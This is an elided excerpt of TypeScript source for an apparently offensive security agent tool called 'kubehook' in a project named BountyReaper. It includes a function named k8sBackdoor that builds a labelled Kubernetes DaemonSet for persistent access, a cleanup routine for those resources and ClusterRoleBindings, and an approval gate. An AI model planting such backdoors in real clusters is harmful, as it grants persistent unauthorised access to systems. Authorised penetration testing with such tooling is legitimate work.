...
const PROGRAMS = {
  ...
  cleanup_k8s: {
    description:
      "Remove all BountyReaper-created Kubernetes resources (by label app=bountyreaper): DaemonSets, CronJobs, ClusterRoleBindings, Pods. ALWAYS run before leaving",
...
async function k8sBackdoor(args: string[], timeout: number): Promise<HookResult> {
  ...
  if (type === "daemonset") {
    ...
    const manifest = JSON.stringify({
      apiVersion: "apps/v1",
      kind: "DaemonSet",
      metadata: { name, namespace: ns, labels: { app: "bountyreaper" } },
      spec: {
        selector: { matchLabels: { app: "bountyreaper", component: name } },
        template: {
          metadata: { labels: { app: "bountyreaper", component: name } },
          spec: {
            containers: [
              {
                name: "agent",
...
async function cleanupK8s(args: string[], timeout: number): Promise<HookResult> {
  ...
  const output: string[] = [
    dryRun
      ...
      : "[*] Cleaning up BountyReaper Kubernetes resources...\n",
  ]
  let cleaned = 0

  const resources = ["daemonsets", "cronjobs", "pods", "jobs"]
  for (const res of resources) {
    const list = await kc(["get", res, "--all-namespaces", "-l", "app=bountyreaper"], kubeconfig, ctx, timeout)
  ...
  const crbs = await kc(["get", "clusterrolebindings", "-l", "app=bountyreaper"], kubeconfig, ctx, timeout)
  if (crbs.exitCode === 0) {
    const items = tryJson(crbs.stdout)?.items || []
    for (const b of items) {
      if (dryRun) {
...
export const KubehookTool = Tool.define("kubehook", {
  ...
  async execute(params, ctx) {
    ...
    try {
      await Gate.ask(ctx, { tool: "kubehook", program: params.program, category: Gate.fromName(params.program) })
